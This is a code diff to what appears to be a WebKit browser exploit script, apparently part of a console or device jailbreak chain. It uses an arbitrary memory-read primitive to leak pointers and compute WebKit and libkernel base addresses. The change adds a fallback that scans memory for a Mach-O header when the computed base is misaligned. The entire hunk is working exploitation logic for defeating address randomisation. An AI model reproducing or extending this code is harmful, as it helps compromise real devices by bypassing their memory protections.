@@ -303,9 +303,32 @@ let payloadRunning = false;
             .add32(off.wk_JSFunction_m_function));
         const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
         const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-        const libkernelBase = errorFn.sub32(off.k__error);
-        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
+        let libkernelBase = errorFn.sub32(off.k__error);
         const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
+        if (!aligned(libkernelBase)) {
+            mark("LIBKERNEL-SCAN", "base " + libkernelBase
+                + " not aligned, scanning for Mach-O header from errorFn=" + errorFn);
+            let found = false;
+            for (let delta = 0x4000; delta <= 0x100000; delta += 0x4000) {
+                const c = errorFn.sub32(delta);
+                if (c.hi === 0 && errorFn.hi > 0) break;
+                try {
+                    const hdr = p.read8(c);
+                    if (hdr.low === 0xFEEDFACF) {
+                        const kErr = errorFn.sub32(c);
+                        if (kErr.hi === 0 && kErr.low > 0x10000 && kErr.low < 0x80000) {
+                            libkernelBase = c;
+                            mark("LIBKERNEL-FOUND", "base=" + c
+                                + " k__error=0x" + kErr.low.toString(16));
+                            found = true;
+                            break;
+                        }
+                    }
+                } catch(e) { break; }
+            }
+            if (!found) mark("LIBKERNEL-SCAN-FAILED", "could not find module header");
+        }
+        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
         if (!check("module-bases-0x4000-aligned",
             aligned(webkitBase) && aligned(libkernelBase), "")) {
             throw new Error("module bases not aligned");
